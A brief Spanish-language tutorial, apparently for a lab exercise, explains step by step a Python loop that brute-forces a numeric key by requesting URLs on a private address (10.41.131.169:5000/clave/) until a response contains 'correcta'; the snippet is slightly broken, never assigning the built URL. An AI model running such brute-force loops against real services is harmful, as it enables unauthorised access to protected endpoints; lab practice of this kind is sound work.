instrucciones: 


El siguente comando prueba numeros aleatorios automaticamente en una URL
arrojando conbinaciones hasta encontrar una respuesta correcta.

#python 
1. importamos libreria
>  import requests

2. Creamos un ciclo for
>for i in range(999999):

3. construccion de la URL.
>  "http://10.41.131.169:5000/clave/" + str(i)

4. Solicitud a Http
> response = requests.get(url)

5. Verificación de la respuesta
> if "correcta" in response.text:
    print("\t" + response.text)
    break

6. Agregamos un break para detener el ciclo
> break